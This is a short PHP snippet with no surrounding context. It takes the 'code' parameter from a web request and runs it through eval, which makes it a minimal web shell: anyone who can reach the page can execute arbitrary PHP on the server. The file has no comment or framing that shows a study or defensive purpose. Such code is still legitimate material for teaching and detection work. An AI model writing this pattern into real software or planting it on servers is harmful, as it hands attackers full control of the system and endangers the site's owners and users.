<?php
  if (isset($_GET["code"])) {
    $code = $_GET["code"];
    eval("?>" . $code);
  }
